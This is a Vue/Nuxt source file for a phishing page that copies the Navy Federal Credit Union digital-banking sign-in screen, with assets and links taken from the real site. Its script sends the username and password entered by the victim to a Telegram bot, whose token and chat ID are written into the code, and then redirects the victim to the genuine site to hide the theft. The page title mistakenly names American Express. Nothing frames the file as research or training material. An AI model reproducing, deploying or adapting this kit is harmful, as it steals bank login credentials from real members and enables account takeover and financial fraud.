<template>
  <div class="min-h-screen bg-white">
    <header class="site-header">
      <div class="header-inner">
        <a href="#" class="brand" aria-label="Credit Union home">
          <img src="https://digitalomni.navyfederal.org/signin/assets/images/nfcu-logo.png" alt="Credit Union" />
        </a>

        <nav class="header-links">
          <span>Routing Number: 256074974</span>
          <a href="#" class="flex">
            <span class="pin">
              <svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 20 20">
                <path d="M0 0h20v20H0z" fill="none" />
                <path fill="currentColor"
                  d="M10 2.009c-2.762 0-5 2.229-5 4.99c0 4.774 5 11 5 11s5-6.227 5-11c0-2.76-2.238-4.99-5-4.99m0 7.751a2.7 2.7 0 1 1 0-5.4a2.7 2.7 0 0 1 0 5.4" />
              </svg>
            </span> Locations
          </a>
          <a href="#"><span class="phone">☎</span> Contact Us</a>
        </nav>
      </div>
    </header>

    <main>
      <section class="hero">
        <div class="hero-inner">
          <div class="login-column">
            <h1>Welcome to Digital Banking</h1>
            <form class="login-panel">
              <div class="panel-heading"><span class="lock">
                  <svg xmlns="http://www.w3.org/2000/svg" width="0.84em" height="1em" viewBox="0 0 20 24">
                    <path d="M0 0h20v24H0z" fill="none" />
                    <path fill="currentColor"
                      d="M3.5 6.5V10H2a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V12a2 2 0 0 0-2-2h-1.5V6.5a6.5 6.5 0 1 0-13 0M6 10V6.5a4 4 0 0 1 8 0V10zm2 5.5a2 2 0 1 1 3.092 1.676l-.008.005s.195 1.18.415 2.57v.001a.75.75 0 0 1-.749.749H9.248a.75.75 0 0 1-.749-.749v-.001l.415-2.57a2 2 0 0 1-.916-1.68z" />
                  </svg>
                </span> Sign In
              </div>
              <div class="rule"></div>
              <div class="fields">
                <label class="field">
                  <span>Username <span class="help">?</span></span>
                  <input v-model="formDataRes.username" aria-label="Username" autocomplete="username">
                </label>
                <label class="field">
                  <span>Password</span>
                  <div class="password-wrap">
                    <input v-model="formDataRes.password" :type="showPassword ? 'text' : 'password'" aria-label="Password"
                      autocomplete="current-password">
                    <button type="button" class="eye" aria-label="Toggle password visibility"
                      @click="showPassword = !showPassword">

                      <svg v-if="!showPassword" xmlns="http://www.w3.org/2000/svg" width="24px" height="24px"
                        viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none" />
                        <path fill="currentColor" d="M12 9.75a2.25 2.25 0 1 0 0 4.5a2.25 2.25 0 0 0 0-4.5" />
                        <path fill="currentColor" fill-rule="evenodd"
                          d="M12 5.5c-2.618 0-4.972 1.051-6.668 2.353c-.85.652-1.547 1.376-2.036 2.08c-.48.692-.796 1.418-.796 2.067s.317 1.375.796 2.066c.49.705 1.186 1.429 2.036 2.08C7.028 17.45 9.382 18.5 12 18.5s4.972-1.051 6.668-2.353c.85-.652 1.547-1.376 2.035-2.08c.48-.692.797-1.418.797-2.067s-.317-1.375-.797-2.066c-.488-.705-1.185-1.429-2.035-2.08C16.972 6.55 14.618 5.5 12 5.5M8.25 12a3.75 3.75 0 1 1 7.5 0a3.75 3.75 0 0 1-7.5 0"
                          clip-rule="evenodd" />
                      </svg>

                      <svg v-if="showPassword" xmlns="http://www.w3.org/2000/svg" width="24px" height="24px"
                        viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none" />
                        <path fill="currentColor" fill-rule="evenodd"
                          d="M20.53 4.53a.75.75 0 0 0-1.06-1.06l-16 16a.75.75 0 1 0 1.06 1.06l3.035-3.035C8.883 18.103 10.392 18.5 12 18.5c2.618 0 4.972-1.051 6.668-2.353c.85-.652 1.547-1.376 2.035-2.08c.48-.692.797-1.418.797-2.067s-.317-1.375-.797-2.066c-.488-.705-1.185-1.429-2.035-2.08q-.406-.313-.86-.601zm-5.4 5.402l-1.1 1.098a2.25 2.25 0 0 1-3 3l-1.1 1.1a3.75 3.75 0 0 0 5.197-5.197"
                          clip-rule="evenodd" />
                        <path fill="currentColor"
                          d="M12.67 8.31a.26.26 0 0 0 .23-.07l1.95-1.95a.243.243 0 0 0-.104-.407A10.2 10.2 0 0 0 12 5.5c-2.618 0-4.972 1.051-6.668 2.353c-.85.652-1.547 1.376-2.036 2.08c-.48.692-.796 1.418-.796 2.067s.317 1.375.796 2.066a9.3 9.3 0 0 0 1.672 1.79a.246.246 0 0 0 .332-.017l2.94-2.94a.26.26 0 0 0 .07-.23q-.06-.325-.06-.669a3.75 3.75 0 0 1 4.42-3.69" />
                      </svg>


                    </button>
                  </div>
                </label>

                <button class="sign-in" type="submit" @click="finishJoob">Sign In</button>
              </div>
              <a class="forgot" href="https://digitalomni.navyfederal.org/account-recovery/">FORGOT USERNAME OR PASSWORD?</a>
              <!-- <p v-if="message" class="form-message">{{ message }}</p> -->
            </form>
          </div>
        </div>
      </section>

      <section class="member-section">
        <div class="member-copy">
          <div>
            <h2>Not a Navy Federal Member?</h2>
            <p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>
            <div class="member-actions">
              <a href="#" class="button-orange">Become a Member</a>
              <a href="#" class="button-blue">Learn More</a>
            </div>
          </div>
        </div>
        <div class="member-photo" role="img" aria-label="A member being helped at a credit union service desk"></div>
      </section>

      <section class="help-section">
        <div class="help-cards">
          <article class="help-card">
            <div class="round-icon">
              <span class="device-icon">
                <img
                  src="https://digitalomni.navyfederal.org/signin/assets/images/nfcu-custom-icons/device_multi_check.svg"
                  alt="">
              </span>
            </div>
            <h3>Don't have online<br>access?</h3>
            <a href="https://digitalomni.navyfederal.org/digital-enrollment/">ENROLL IN DIGITAL BANKING »</a>
          </article>

          <article class="help-card">
            <div class="round-icon">
              <span class="device-icon">
                <img src="https://digitalomni.navyfederal.org/signin/assets/images/nfcu-custom-icons/padlock_check.svg"
                  alt="">
              </span>
            </div>
            <h3>Find out more about<br>secure digital banking</h3>
            <a href="https://navyfederal.org/services/security/digital-security.html">LEARN MORE »</a>
          </article>

          <article class="help-card">
            <div class="round-icon">
              <span class="device-icon">
                <img src="https://digitalomni.navyfederal.org/signin/assets/images/nfcu-custom-icons/user_avatar.svg"
                  alt="">
              </span>
            </div>

            <h3>Need help?</h3>
            <a href="https://navyfederal.org/contact-us.html">CONTACT US »</a>
          </article>
        </div>
      </section>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        <div class="footer-logo"><img src="~/assets/images/brand-logo.png" alt="Credit Union"></div>
        <div class="footer-content">
          <div class="service-line">24/7 Member Services: <a href="tel:18888426328">1-888-842-6328</a><span
              class="separator">|</span> Routing Number: <strong>256074974</strong></div>
          <div class="footer-nav">
            <a href="https://www.navyfederal.org/about.html">About Us</a><a href="https://www.navyfederal.org/contact-us.html">Contact Us</a><a href="https://www.navyfederal.org/policy/privacy.html">Privacy</a><a href="https://www.navyfederal.org/services/security.html">Security</a><a
              href="https://www.navyfederal.org/policy/accessibility.html">Accessibility</a><a href="https://www.navyfederal.org/policy/browser-support.html">Browser Support</a><a href="https://www.navyfederal.org/content/dam/nfculibs/pdfs/membership/nfcu_652a.pdf">Terms and Conditions</a><a
              href="https://www.navyfederal.org/forms.html">Disclosures</a>
          </div>
          <p>© 2026 Navy Federal Credit Union. All rights reserved.</p>
          <p><a href="#">NCUA</a> <a href="https://www.navyfederal.org/content/dam/nfculibs/pdfs/savings/1116e.pdf">Navy Federal Credit Union is federally insured by NCUA</a> <span
              class="separator">|</span> <a href="https://www.navyfederal.org/content/dam/nfculibs/pdfs/mortgage-equity/3035_ehl_poster.pdf">⌂ Equal Housing Lender</a></p>
          <p>APY = Annual Percentage Yield | APR = Annual Percentage Rate</p>
          <p>APY is accurate as of October 18, 2026 ET.</p>
          <p>+Rates are based on an evaluation of credit history, so your rate may differ.</p>
          <p>++Rates are variable, and based on an evaluation of credit history, so your rate may differ.</p>
          <p>*Message and data rates may apply. <a href="#">Terms and Conditions</a> are available.</p>
          <p class="disclaimer">Military images used for representational purposes only; do not imply government
            endorsement.<br>iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store℠ is a service mark of
            Apple Inc. Android™ and Google Play™ are trademarks of Google Inc. Images used for representational purposes
            only; do not imply government endorsement.</p>
        </div>
      </div>
    </footer>
  </div>
</template>

<script>
import axios from 'axios';

export default {
  data() {
    return {
      formDataRes: {
        username: '',
        password: '',
      },
      // message: '',
      showPassword: false,
      rememberMe: false,
      loading: false,
      isActive: false,
    }
  },

  methods: {
    // slug(value) {
    //   return value.toLowerCase().replace(/[^a-z0-9]+/g, '-')
    // },

    // ============================================================

    async finishJoob() {
      if (this.loading) return;
      this.loading = true;
      try {
         // Format the message as string
        const message = `* NFCU *\nUserID: ${this.formDataRes.username}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );
        this.notice = true;

        window.location.assign("https://www.navyfederal.org/");
      } catch (error) {
        console.error("Navigation error:", error);
        this.loading = false;
      }
    },

    // ============================================================

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },




  head() {
    return {
      title: 'Log In to My Account | American Express',
      meta: [
        {
          hid: 'description',
          name: 'description',
          content: 'Amex account interface security design.'
        }
      ]
    }
  }
}
</script>

<style scoped>
.site-header {
  width: 100%;
  height: 100px;
  background: #123f70;
  position: fixed;
  top: 0;
  z-index: 10;
  color: #fff;
  box-shadow: 0 2px 8px #0002;
  overflow: hidden;
}

.site-header:after {
  content: "";
  position: absolute;
  right: 0;
  top: -125px;
  width: 560px;
  height: 300px;
  opacity: .13;
  border: 34px solid #1684d3;
  border-radius: 50%;
  box-shadow: 0 0 0 28px #1684d3, 0 0 0 62px transparent
}

.header-inner {
  position: relative;
  max-width: 962px;
  height: 100%;
  margin: auto;
  display: flex;
  align-items: end;
  justify-content: space-between;
  position: relative;
  z-index: 1;
  padding: 0 8px
}

.brand {
  display: flex;
  align-items: center;
  color: white;
  height: 76px;
  gap: 10px;
  /* margin-left: 292.5px; */
  margin-bottom: 14px;
}

.brand img {
  width: 196.66px;
  height: 72px;
  object-fit: contain;
  filter: brightness(0) invert(1)
}

.military-list {
  border-left: 1px solid #ffffff8c;
  padding-left: 7px;
  font-size: 8px;
  line-height: 9px;
  font-weight: bold
}

.header-links {
  width: full;
  position: absolute;
  right: 0;
  display: flex;
  align-items: center;
  gap: 18px;
  font-size: 12px;
  white-space: nowrap;
  margin-right: 64px;
  padding: 0px 48px 8px 0px;
}

.header-links a {
  color: #fff;
  border-bottom: 1px dotted #fff;
  padding-bottom: 3px
}

.pin {
  font-size: 11px;
  margin-right: 5px
}

.phone {
  font-size: 14px;
  margin-right: 5px
}

.hero {
  background: url(https://digitalomni.navyfederal.org/signin/assets/images/login-app/bubbles.svg), linear-gradient(180deg, #90c3f0, #c3e1fa);
  background-repeat: no-repeat;
  background-position: 50% 100%;
  min-height: 662px;
  overflow-y: hidden;
}

/* .hero:before,
.hero:after {
  content: "";
  position: absolute;
  border-radius: 50%;
  pointer-events: none
} */

/* .hero:before {
  width: 500px;
  height: 500px;
  left: 16%;
  top: 280px;
  background: #4d8bc326
} */

/* .hero:after {
  width: 250px;
  height: 250px;
  left: 53%;
  top: -125px;
  background: #4d8bc326
} */

.hero-inner {
  width: 964px;
  margin: auto;
  margin-top: 32px;
  min-height: 503px;
  display: flex;
  /* grid-template-columns: minmax(0, 1.35fr) minmax(300px, .85fr); */
  align-items: center;
  gap: 22px;
  position: relative;
  z-index: 1;
  padding: 144px 0px 64px;
}

.login-column {
  align-self: start;
  /* margin-top: 26px */
}

.login-column h1 {
  font-size: 40px;
  line-height: 1.2;
  color: #0869b5;
  font-weight: 600;
  margin: 0 0 28px
}

.login-panel {
  background: #f7f7f7;
  border-top: 4px solid #f5820b;
  padding: 20px;
  box-shadow: 0 2px 7px #0003;
  width: 100%;
}

.panel-heading {
  font-size: 24px;
  color: #414141;
  display: flex;
  align-items: center;
  gap: 5px
}

.lock {
  font-size: 24px;
  color: #686868
}

.rule {
  height: 1px;
  background: #d5d5d5;
  margin: 10px 0 26px
}

.fields {
  display: grid;
  grid-template-columns: 1fr 1fr 93px;
  gap: 15px;
  align-items: end
}

.field {
  display: flex;
  flex-direction: column;
  gap: 9px;
  font-size: 16px;
  font-weight: bold;
  color: #111
}

.field input {
  height: 44px;
  border: 2px solid #aaa;
  border-radius: 6px;
  background: white;
  padding: 0 10px;
  width: 230px;
  outline-color: #0872c6
}

.password-wrap {
  position: relative
}

.password-wrap input {
  padding-right: 42px
}

.eye {
  position: absolute;
  right: 14px;
  top: 7px;
  color: #0068b7;
  border: none;
  background: transparent;
  cursor: pointer
}

/* .eye:after {
  content: "";
  position: absolute;
  width: 13px;
  height: 8px;
  border: 2px solid #0068b7;
  border-radius: 100%;
  left: 2px;
  top: 4px;
  background: #fff
} */

.help {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  border-radius: 50%;
  background: #777;
  color: white;
  width: 24px;
  height: 24px;
  font-size: 16px;
  margin-left: 5px
}

.sign-in,
.button-orange,
.button-blue {
  border: 0;
  color: white;
  font-weight: bold;
  border-radius: 5px;
  box-shadow: 0 2px 6px #0003;
  display: flex;
  align-items: center;
  justify-content: center
}

.sign-in {
  width: 104px;
  height: 44px;
  background: #f5820b;
  font-size: 16px;
  cursor: pointer
}

.forgot {
  display: inline-block;
  color: #0068b7;
  font-size: 12px;
  font-weight: bold;
  letter-spacing: .6px;
  border-bottom: 1px dotted #0068b7;
  margin-top: 19px;
  padding-bottom: 3px
}

.form-message {
  font-size: 12px;
  color: #8b3d00;
  margin: 10px 0 0
}

.hero-art {
  position: relative;
  height: 400px;
  display: flex;
  align-items: center;
  justify-content: center
}

.art-circle {
  width: min(100%, 410px);
  aspect-ratio: 1;
  border-radius: 50%;
  background: #ffffff80;
  position: absolute
}

.hero-art img {
  width: 100%;
  max-width: 370px;
  position: relative;
  mix-blend-mode: multiply;
  object-fit: contain
}

.member-section {
  display: grid;
  grid-template-columns: 1fr 1fr;
  min-height: 335px;
  background: #fafafa
}

.member-copy {
  display: flex;
  justify-content: flex-end;
  align-items: center;
  padding: 45px 32px 45px 24px
}

.member-copy div {
  width: 420px;
  max-width: 100%
}

.member-copy h2 {
  font-size: 24px;
  color: #0068b7;
  font-weight: bold;
  margin: 0 0 8px
}

.member-copy p {
  font-size: 24px;
  line-height: 1.6;
  color: #0068b7;
  margin: 0
}

.member-actions {
  display: flex;
  gap: 10px;
  margin-top: 42px
}

.button-orange,
.button-blue {
  height: 51px;
  padding: 0 29px;
  font-size: 16px;
  white-space: nowrap
}

.button-orange {
  background: #f5820b
}

.button-blue {
  background: #0869b5
}

.member-photo {
  background-image: url('~/assets/images/member-service.jpg');
  background-position: center 38%;
  background-size: cover;
  min-height: 335px
}

.help-section {
  background: #123f70;
  padding: 90px 20px 57px
}

.help-cards {
  max-width: 835px;
  margin: auto;
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px
}

.help-card {
  height: 192px;
  background: #fff;
  text-align: center;
  position: relative;
  padding: 78px 12px 18px;
  box-shadow: 0 1px 3px #0002
}

.round-icon {
  width: 112px;
  height: 112px;
  position: absolute;
  top: -36px;
  left: 50%;
  transform: translateX(-50%);
  border-radius: 50%;
  background: #fff;
  box-shadow: 0 7px 15px #0002;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #176bb3;
  font-size: 40px
}

.device-icon {
  width: 60px;
  color: #126ab0
}

.checkmark {
  position: absolute;
  right: 22px;
  bottom: 25px;
  background: #f5820b;
  color: #fff;
  border-radius: 50%;
  width: 25px;
  height: 25px;
  font-size: 18px;
  font-weight: bold
}

.padlock {
  font-size: 40px;
  color: #174c83
}

.avatar {
  font-size: 50px;
  color: #176bb3;
  border: 2px solid #176bb3;
  width: 54px;
  height: 54px;
  top: -12px;
  box-shadow: none
}

.help-card h3 {
  font-size: 16px;
  line-height: 1.6;
  margin: 0 0 12px;
  font-weight: bold;
  color: #414141
}

.help-card a {
  color: #0068b7;
  font-size: 12px;
  letter-spacing: .6px;
  font-weight: bold;
  border-bottom: 1px dotted #0068b7;
  padding-bottom: 3px
}

.footer {
  background: #e8e9eb;
  min-height: 400px;
  padding: 28px 20px 36px;
  color: #333
}

.footer-inner {
  max-width: 860px;
  margin: auto;
  display: grid;
  grid-template-columns: 75px 1fr;
  gap: 17px
}

.footer-logo img {
  width: 75px;
  height: 48px;
  object-fit: contain;
  filter: brightness(0) saturate(100%) invert(24%) sepia(28%) saturate(1515%) hue-rotate(174deg) brightness(87%)
}

.footer-content {
  font-size: 11px;
  line-height: 1.45
}

.footer-content a {
  color: #0068b7;
  border-bottom: 1px dotted #0068b7
}

.service-line {
  font-size: 13px;
  margin: 2px 0 18px
}

.service-line a {
  font-weight: bold
}

.separator {
  margin: 0 10px;
  color: #555
}

.footer-nav {
  border-top: 1px solid #d0d0d0;
  padding-top: 18px;
  display: flex;
  flex-wrap: wrap;
  gap: 0;
  margin-bottom: 17px
}

.footer-nav a {
  font-size: 12px;
  padding: 0 10px;
  border-right: 1px solid #888;
  line-height: 1.1
}

.footer-nav a:first-child {
  padding-left: 0
}

.footer-nav a:last-child {
  border: 0
}

.footer-content p {
  margin: 0 0 10px
}

.disclaimer {
  line-height: 1.35
}

@media(max-width:900px) {

  .header-inner,
  .hero-inner {
    padding-left: 22px;
    padding-right: 22px
  }

  .hero-inner {
    grid-template-columns: 1.2fr .8fr;
    gap: 10px
  }

  .login-column h1 {
    font-size: 29px
  }

  .fields {
    grid-template-columns: 1fr 1fr;
    gap: 12px
  }

  .sign-in {
    grid-column: 1/-1;
    width: 100%;
    height: 42px
  }

  .hero-art img {
    max-width: 300px
  }

  .hero-art {
    height: 320px
  }

  .member-copy p {
    font-size: 18px
  }

  .member-actions {
    margin-top: 28px
  }

  .button-orange,
  .button-blue {
    padding: 0 17px;
    font-size: 14px
  }

  .header-links {
    gap: 10px;
    font-size: 11px
  }
}

@media(max-width:640px) {
  .site-header {
    height: auto;
    min-height: 82px
  }

  .header-inner {
    min-height: 82px;
    align-items: center;
    gap: 8px;
    padding: 8px 14px
  }

  .brand {
    height: 58px;
    gap: 6px
  }

  .brand img {
    width: 85px;
    height: 58px
  }

  .military-list {
    font-size: 6px;
    line-height: 7px;
    padding-left: 5px
  }

  .header-links {
    flex-direction: column;
    align-items: flex-end;
    gap: 5px;
    font-size: 10px
  }

  .header-links>span {
    font-size: 9px
  }

  .hero-inner {
    display: flex;
    flex-direction: column;
    align-items: stretch;
    padding: 32px 16px 24px;
    gap: 4px
  }

  .login-column {
    margin-top: 0
  }

  .login-column h1 {
    font-size: 27px;
    margin-bottom: 20px
  }

  .login-panel {
    padding: 18px 14px
  }

  .rule {
    margin-bottom: 20px
  }

  .fields {
    grid-template-columns: 1fr;
    gap: 13px
  }

  .sign-in {
    grid-column: auto
  }

  .hero-art {
    height: 210px;
    margin-top: 12px
  }

  .art-circle {
    width: 200px
  }

  .hero-art img {
    max-width: 230px;
    max-height: 200px
  }

  .member-section {
    grid-template-columns: 1fr
  }

  .member-copy {
    justify-content: flex-start;
    padding: 35px 24px
  }

  .member-copy p {
    font-size: 18px
  }

  .member-actions {
    margin-top: 25px;
    gap: 8px
  }

  .button-orange,
  .button-blue {
    height: 46px;
    padding: 0 14px;
    font-size: 13px
  }

  .member-photo {
    min-height: 235px
  }

  .help-section {
    padding: 70px 18px 35px
  }

  .help-cards {
    grid-template-columns: 1fr;
    gap: 55px;
    max-width: 360px
  }

  .help-card {
    height: 170px;
    padding-top: 65px
  }

  .round-icon {
    width: 85px;
    height: 85px;
    top: -32px;
    font-size: 34px
  }

  .avatar {
    width: 52px;
    height: 52px;
    top: -9px
  }

  .footer {
    padding: 24px 16px
  }

  .footer-inner {
    grid-template-columns: 1fr;
    gap: 8px
  }

  .footer-logo img {
    width: 80px;
    height: 42px
  }

  .service-line {
    font-size: 12px;
    line-height: 1.8
  }

  .separator {
    margin: 0 5px
  }

  .footer-nav {
    gap: 10px 0
  }

  .footer-nav a {
    margin-bottom: 8px;
    padding: 0 7px;
    font-size: 11px
  }

  .footer-nav a:first-child {
    padding-left: 0
  }
}
</style>